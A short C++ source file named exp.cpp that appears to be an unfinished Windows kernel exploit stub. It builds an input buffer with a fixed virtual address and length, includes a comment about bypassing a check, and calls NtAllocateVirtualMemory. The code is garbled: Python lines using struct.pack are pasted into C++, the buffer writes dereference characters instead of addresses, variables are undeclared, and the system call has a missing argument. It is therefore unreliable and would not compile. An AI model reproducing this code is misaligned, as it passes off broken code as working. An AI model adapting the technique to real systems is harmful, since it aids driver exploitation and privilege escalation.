// exp.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <ntifs.h>

void create_buffer1()
{
	int		size = 0x30;
	int		virtualAddress = 0x18888888;
	int		length = 0x20000;
	char	buffer[0x30] = {'\0'};

	*(int *)(buffer[0x18]) = virtualAddress;
	*(int *)(buffer[0x18 + 0x4]) = length;
	*(int *)(buffer[0x18 + 0x4 + 0x8]) = length;

	inbuf1  = "\x00" * 0x18 + struct.pack("L", virtualAddress)    #0x1a
    inbuf1 += struct.pack("L", length)            #0x20
    inbuf1 += "\x00" * 0x8 + "\x01"   				#bypass var_6c
    inbuf1 += "\x00" * (inbuf1size - len(inbuf1))
      
	NtAllocateVirtualMemory(-1, );
}


int _tmain(int argc, _TCHAR* argv[])
{
	return 0;
}

